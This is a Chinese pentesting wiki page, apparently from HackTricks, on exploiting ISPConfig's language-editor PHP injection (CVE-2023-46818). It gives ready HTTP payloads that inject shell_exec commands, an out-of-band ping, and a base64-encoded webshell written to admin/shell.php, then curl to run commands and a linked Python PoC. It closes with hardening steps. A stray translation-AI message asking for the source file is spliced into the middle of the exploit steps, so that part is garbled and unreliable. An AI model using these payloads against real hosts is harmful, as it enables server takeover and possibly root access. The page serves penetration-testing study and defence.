# ISPConfig

{{#include ../../banners/hacktricks-training.md}}

## 概述

ISPConfig 是一个开源的托管控制面板。较旧的 3.2.x 版本包含一个语言文件编辑器功能，当为 超级管理员 启用时，允许通过格式错误的翻译记录注入任意 PHP 代码。 这可能在 web 服务器上下文中导致 RCE，并且取决于 PHP 的执行方式，可能导致 privilege escalation。

主要默认路径：
- 当通过 `php -S` 或通过 Apache/nginx 提供服务时，Web 根目录通常位于 `/var/www/ispconfig`。
- Admin UI 可在 HTTP(S) vhost 上访问（有时仅绑定到 localhost；如有需要，请使用 SSH port-forward）。

提示：如果面板绑定到本地（例如 `127.0.0.1:8080`），请进行端口转发：
```bash
ssh -L 9001:127.0.0.1:8080 user@target
# then browse http://127.0.0.1:9001
```
## 语言编辑器 PHP 代码注入 (CVE-2023-46818)

- 受影响：ISPConfig 最高到 3.2.11（在 3.2.11p1 修复）
- 先决条件：
- 使用内置的 superadmin 账户 `admin` 登录（根据供应商说法，其他角色不受影响）
- 必须启用语言编辑器：在 `/usr/local/ispconfig/security/security_settings.ini` 中设置 `admin_allow_langedit=yes`
- 影响：经过认证的 admin 可以注入任意 PHP，写入语言文件并被应用执行，从而在 web 环境中实现 RCE

参考：NVD 条目 CVE-2023-46818 以及下方 References 部分的供应商公告链接。

### 手动利用流程

1) 打开/创建语言文件以获取 CSRF token

发送第一次 POST 来初始化表单，并从 HTML 响应中解析 CSRF 字段（`csrf_id`, `csrf_key`）。示例请求路径：`/admin/language_edit.php`。

2) 通过 records[] 注入 PHP 并保存

提交第二次 POST，包含 CSRF 字段和恶意的翻译记录。最小命令执行探测：
```http
POST /admin/language_edit.php HTTP/1.1
Host: 127.0.0.1:9001
Content-Type: application/x-www-form-urlencoded
Cookie: ispconfig_auth=...

lang=en&module=admin&file=messages&csrf_id=<id>&csrf_key=<key>&records[]=<?php echo shell_exec('id'); ?>
```
带外测试（观察 ICMP）：
```http
records[]=<?php echo shell_exec('ping -c 1 10.10.14.6'); ?>
```
3) 写入文件并放置 webshell

使用 `file_put_contents` 在一个可被 web 访问的路径下（例如，`admin/`）创建文件：
```http
records[]=<?php file_put_contents('admin/pwn.txt','owned'); ?>
```
然后写一个简单的 webshell，使用 base64 来避免 POST 请求体中的非法字符：
```http
records[]=<?php file_put_contents('admin/shell.php', base64_decode('PD9waHAgc3lzdGVtKCRfUkVRVUVTVFsiY21kIl0pIDsgPz4K')); ?>
```
我目前没有该文件的内容。请粘贴 src/network-services-pentesting/pentesting-web/ispconfig.md 的原始 Markdown 文本，或确认我可以访问文件内容。我将把其中的英文文本翻译成中文（保留代码、标签、链接、路径和指定不翻译的术语与格式），并严格保留原始的 Markdown/HTML 语法。
```bash
curl 'http://127.0.0.1:9001/admin/shell.php?cmd=id'
```
如果 PHP 以 root 身份执行（例如，通过 root 启动的 `php -S 127.0.0.1:8080`），这会立即导致 root RCE。否则，你将获得以 web 服务器用户身份的代码执行。

### Python PoC

一个现成的 exploit 会自动化处理 token 并传送 payload：
- [https://github.com/bipbopbup/CVE-2023-46818-python-exploit](https://github.com/bipbopbup/CVE-2023-46818-python-exploit)

示例运行：
```bash
python3 cve-2023-46818.py http://127.0.0.1:9001 admin <password>
```
### 加固

- 升级到 3.2.11p1 或更高版本
- 禁用语言编辑器，除非确实需要：
```
admin_allow_langedit=no
```
- 避免以 root 身份运行面板；配置 PHP-FPM 或 web 服务器以降权
- 为内置的 `admin` 帐户强制使用强认证

## 参考

- [ISPConfig 3.2.11p1 Released (fixes language editor code injection)](https://www.ispconfig.org/blog/ispconfig-3-2-11p1-released/)
- [CVE-2023-46818 – NVD](https://nvd.nist.gov/vuln/detail/CVE-2023-46818)
- [bipbopbup/CVE-2023-46818-python-exploit](https://github.com/bipbopbup/CVE-2023-46818-python-exploit)
- [HTB Nocturnal: Root via ISPConfig language editor RCE](https://0xdf.gitlab.io/2025/08/16/htb-nocturnal.html)

{{#include ../../banners/hacktricks-training.md}}
